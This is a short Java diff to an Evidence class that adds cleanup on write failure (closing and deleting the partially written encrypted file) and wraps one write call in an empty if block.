@@ -472,10 +472,21 @@ public final class Evidence {
             os.write(Utils.intToByteArray(data.length - offset));
             os.write(encData);
             os.flush();
+
         } catch (final IOException e) {
             //#ifdef DEBUG
             debug.error("Error writing file: " + e);
             //#endif
+            
+            close();
+            try {
+                fconn.delete();
+            } catch (IOException ex) {
+                //#ifdef DEBUG
+                debug.error("writeEvidence, deleting due to error: " + ex);
+                //#endif
+            }
+            fconn=null;
             return false;
         }
 
@@ -592,7 +603,9 @@ public final class Evidence {
     public synchronized void atomicWriteOnce(byte[] additionalData,
             byte[] content) {
         createEvidence(additionalData);
-        writeEvidence(content);
+        if(!writeEvidence(content)){
+           
+        }
         close();
     }
 
